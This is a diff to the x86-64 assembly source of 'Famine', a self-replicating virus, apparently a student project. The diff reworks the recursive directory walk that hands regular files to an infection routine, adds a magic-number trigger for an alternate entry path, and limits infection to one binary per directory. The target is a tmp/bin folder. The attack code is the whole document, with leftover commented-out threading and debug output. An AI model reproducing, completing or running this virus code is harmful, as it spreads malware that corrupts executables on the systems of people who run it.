@@ -15,7 +15,6 @@ section .text
 	global _string
 	global _read_dir
 	global _ft_strlen
-	global _munmap_thread
 	extern _treat_file
 	extern _final_end
 	extern _thread_create
@@ -25,6 +24,10 @@ _o_entry:
 
 _string:
 	db 'Famine version 1.0 (c)oded by cdrouet-rludosan', 0
+
+_verif:
+	dq 0x1122334455667788
+	db 0
 
 _start:
 ;	enter 16, 0
@@ -36,30 +39,38 @@ _start:
 ; to pop them in the ;
 ; same state before  ;
 ; we jmp on o_entry  ;
-	push rbx
-	push rcx
-	push rdx
-	push rsi
-	push rdi
-	push r8
-	push r9
-	push r10
-	push r11
-	push r12
-	push r13
-	push r14
-	push r15
+	push rbx ; +8
+	push rcx ; +16
+	push rdx ; +24
+	push rsi ; +32
+	push rdi ; +40
+	push r8 ; +48
+	push r9 ; +56
+	push r10 ; +64
+	push r11 ; +72
+	push r12 ; +80
+	push r13 ; +88
+	push r14 ; +96
+	push r15 ; +104
+	cmp QWORD [rsp + 128], 3
+	je _alternative_start
+_continue_normaly:
+;	lea rax, [rel _o_entry]
+;	cmp QWORD [rax], 0
+;	jne _jmp_to_o_entry
 ;;;;;;;;;;;;;;;;;;;;;;
 ;	push 0x000000000000002f ; /
 	mov rax, 0x0000000000000000
 	push rax
 	push rax
 ;	mov rax, 0x747365742f706d74 ; tmp/test
-;	mov rax, 0x006e69622f706d74 ; tmp/bin
+	mov rax, 0x006e69622f706d74 ; tmp/bin
 	push rax
 	mov rdi, rsp
 	mov rsi, rsp
 	add rsi, 16
+	mov rax, 1
+	push rax
 	push rsi
 	push rdi
 	call _read_dir
@@ -73,22 +84,44 @@ _start:
 	pop rdi
 	pop rdi
 	pop rdi
+	pop rdi
 	lea rax, [rel _o_entry] ; mov in rax the o_entry address
 	cmp QWORD [rax], 0 ; if this address is 0, so we are in famine exec, and we need to exit
 	jne _jmp_to_o_entry
 _force_exit:
-	mov rax, 60 ; exit syscall number, will not be in final code
 	mov rdi, 0
+	mov rax, 60 ; exit syscall number, will not be in final code
 	syscall
 
-_munmap_thread:
-	mov rax, 11
-	mov rdi, rsp
-	add rdi, 16
-	sub rdi, STACK_SIZE
-	mov rsi, STACK_SIZE
-	syscall
-	jmp _force_exit
+_alternative_start:
+	mov r10, QWORD [rsp + 144]
+	lea r11, [rel _verif]
+	mov r11, QWORD [r11]
+	cmp QWORD [r10], r11
+	jne _continue_normaly
+	mov rsi, QWORD [rsp + 152]
+	mov rdi, QWORD [rsp + 136]
+;	mov rsi, QWORD [rsp + 160]
+	mov rax, 0
+	push rax
+	push rsi
+	push rax
+	call _read_dir
+	pop rdi
+	pop rdi
+	pop rdi
+	mov rdi, 0
+	lea rax, [rel _force_exit]
+
+;_munmap_thread:
+;	mov rax, 11
+;	mov rdi, rsp
+;	add rdi, 16
+;	sub rdi, STACK_SIZE
+;	mov rsi, STACK_SIZE
+;	syscall
+;	mov rdi, 11
+;	jmp _force_exit
 
 _jmp_to_o_entry:
 	pop r15
@@ -127,7 +160,7 @@ _read_dir: ; void read_dir(char *actual_directory, char *path_of_dir)
 ;	push rbp
 ;	mov rbp, rsp
 ;	sub rsp, 368
-	enter 368, 0
+	enter 392, 0
 	; rsp + 0: dir struct
 	; rsp + 280: virus size
 	; rsp + 288: fd directory
@@ -138,11 +171,17 @@ _read_dir: ; void read_dir(char *actual_directory, char *path_of_dir)
 	; rsp + 328: size arg 2
 	; rsp + 336: total size
 	; rsp + 344: 2 arg
+	; rsp + 352: nb_thread launched
+	; rsp + 360: bool, indicating if a binary have already been infected in the current directory
+	; rsp + 368: bool, enable recursif
 	; rsp - size: size of total path for this dir
-	mov rdi, QWORD [rsp + 384]
-	mov rsi, QWORD [rsp + 392]
+	mov rdi, QWORD [rsp + 408]
+	mov rsi, QWORD [rsp + 416]
+	mov rax, QWORD [rsp + 424]
+	mov QWORD [rsp + 368], rax
 	mov QWORD [rsp + 312], rdi ; store first arg in stack
 	mov QWORD [rsp + 344], rsi
+	mov QWORD [rsp + 360], 0
 	mov rdi, rsi ; calcul len of arg 2
 	call _ft_strlen
 	mov QWORD [rsp + 328], rax ; store arg2 len in stack
@@ -154,6 +193,20 @@ _read_dir: ; void read_dir(char *actual_directory, char *path_of_dir)
 	mov r10, QWORD [rsp + 328]
 	add QWORD [rsp + 336], r10
 	add QWORD [rsp + 336], 2
+	mov QWORD [rsp + 352], 0
+;	mov rax, 9
+;	mov rdi, 0
+;	mov rsi, 4096
+;	mov rdx, 3
+;	mov r10, 34
+;	mov r8, -1
+;	mov r9, 0
+;	syscall
+;	cmp rax, 0
+;	jle _end_ret
+;	mov QWORD [rsp + 360], rax
+;	add QWORD [rsp + 360], 4096
+;	sub QWORD [rsp + 360], 8
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; we need a dynamic buffer to store our concatenation, but we can't touch rsp,
 ; to don't corrupt the datas offset is stack (if we sub 8 to rsp, rsp + 0 become rsp + 8)
@@ -217,6 +270,23 @@ _read_dir: ; void read_dir(char *actual_directory, char *path_of_dir)
 	add rdi, QWORD [rsp + 320]
 	mov BYTE [rdi], 0
 
+_print:
+	mov rax, 1
+	mov rdi, 1
+	mov rsi, rsp
+	sub rsi, QWORD [rsp + 336]
+	mov rdx, QWORD [rsp + 336]
+	syscall
+	mov rax, 1
+	mov rdi, 1
+	lea rsi, [rel _lol]
+	mov rdx, 1
+	syscall
+	jmp _calculate_virus_size
+
+_lol:
+	db 10
+
 _calculate_virus_size:
 ; virus_size = (&_final_end + 2) - &_string
 	xor r10, r10 ; r10 = 0
@@ -245,7 +315,7 @@ _open_dir:
 	add rsp, QWORD [rsp]
 ;	pop rdi ; we pushed, so we pop
 	cmp rax, -1 ; if open return something under or equal of -1, jump to end
-	jle _end
+	jle _close_dir
 	mov QWORD [rsp + 288], rax ; fd directory = return of open (fd)
 
 _file_loop:
@@ -263,7 +333,7 @@ _file_loop:
 	add rsp, QWORD [rsp]
 ; check getdents64 return
 	cmp rax, 0 ; we check if getdents64 read something, if not, we are at the end of dir or their is an error
-	jle _end
+	jle _close_dir
 ; set the theoric maximum address for the readed datas in our buffer
 	mov r10, rax ; mov to r10 the number of bytes readed
 	add r10, rsp ; set the maximum theoric address for the readed datas (start buffer address + number of bytes read)
@@ -280,13 +350,18 @@ _read_data:
 	xor r12, r12 ; r12 = 0
 	mov r12b, BYTE [rsi + 18]
 	cmp r12, 4
-	je _recursiv_infect
+	je _test_bool ;_recursiv_infect
 ; offset 18 is the file type. We check if it's a regular file
 	xor r12, r12 ; r12 = 0
 	mov r12b, BYTE [rsi + 18] 
 	cmp r12, 8
 	jne _continue
+	cmp QWORD [rsp + 368], 1
+	jne _treat_normally
+	cmp QWORD [rsp + 360], 1
+	je _continue
 ; now we call _treat_file, with our current file.
+_treat_normally:
 	add rsi, 19 ; in the dirent struct, the name of te file is at offset 19
 	mov rdi, rsi
 	mov rsi, QWORD [rsp + 280]
@@ -299,8 +374,15 @@ _read_data:
 	add QWORD [rsp], 8
 	call _treat_file
 	add rsp, QWORD [rsp]
+	cmp rax, 0
+	je _continue
 ; reinit rsi for next loop
+	mov QWORD [rsp + 360], 1
 	jmp _continue
+
+_test_bool:
+	cmp QWORD [rsp + 368], 1
+	jne _continue
 
 _recursiv_infect:
 	mov rsi, QWORD [rsp + 296]
@@ -311,31 +393,59 @@ _recursiv_infect:
 	je _continue
 ;	mov rdi, rsi
 ;	mov rsi, rsp
-	lea rdi, [rel _read_dir]
-	mov rdx, rsp
-	mov r10, QWORD [rsp + 336]
-;	sub rsi, r10
-	sub rdx, r10
+
+;_check_for_max_fork:
+;	cmp QWORD [rsp + 352], 4
+;	jl _max_thread_per_process
+;_lab_lol:
+;;	call _read_dir
+;	mov rax, 61
+;	mov rdi, -1
+;	mov rsi, 0
+;	mov rdx, 0
+;	mov r10, 0
+;	mov r8, 0
+;	syscall
+;	dec QWORD [rsp + 352]
+;	jmp _max_thread_per_process
+
+;_max_thread_per_process:
+;	lea rdi, [rel _read_dir]
+;	mov rdx, rsp
+;	mov r10, QWORD [rsp + 336]
+;	mov rsi, QWORD [rsp + 296]
+;	add rsi, 19
+;	sub rdx, r10
+;	sub rsp, r10
+;	sub rsp, 8
+;	mov QWORD [rsp], r10
+;	add QWORD [rsp], 8
+;	call _thread_create
+;	add rsp, QWORD [rsp]
+;	cmp rax, -1
+;	jg _update_rsp
+
+	mov rdi, QWORD [rsp + 296]
+	add rdi, 19
+	mov rsi, rsp
+	mov r10, QWORD [rsp + 336] 
+	sub rsi, r10
 	sub rsp, r10
 	sub rsp, 8
 	mov QWORD [rsp], r10
 	add QWORD [rsp], 8
-_lab_lol:
-;	call _read_dir
-	call _thread_create
-	cmp rax, -1
-	jne _update_rsp
-	mov rdi, QWORD [rsp + 296]
-	add rdi, 19
-	mov rsi, rsp
-	add rsi, 8
-	push rdi
+	mov rax, 1
+	push rax
 	push rsi
+	push rdi
 	call _read_dir
 	pop rdi
 	pop rdi
-_update_rsp:
+	pop rdi
 	add rsp, QWORD [rsp]
+	jmp _continue
+_update_rsp:
+	inc QWORD [rsp + 352]
 
 _continue:
 ; reinit/increment registers/stack variable for next loop
@@ -346,10 +456,37 @@ _continue:
 	mov QWORD [rsp + 296], rsi
 	jmp _read_data
 
-_end:
+_close_dir:
 ; Close directory
 	mov rax, 3
 	mov rdi, QWORD [rsp + 288]
 	syscall
+	jmp _end_ret
+
+_loop_wait_for_all_thread_to_exit:
+	cmp QWORD [rsp + 352], 0
+	jle _end_ret
+	mov rax, 61
+;	mov r10, rsp
+;	mov rsp, QWORD [r10 + 360]
+;	pop rdi
+;	mov QWORD [r10 + 360], rsp
+;	mov rsp, r10
+	mov rdi, -1
+;	mov rdi, 0
+	mov rsi, 0
+	mov rdx, 0
+	mov r10, 0
+;	mov rdx, 0
+	mov r8, 0
+	syscall
+	dec QWORD [rsp + 352]
+	jmp _loop_wait_for_all_thread_to_exit
+
+_end_ret:
+;	mov rax, 11
+;	mov rdi, QWORD [rsp + 360]
+;	mov rsi, 4096
+;	syscall
 	leave
 	ret
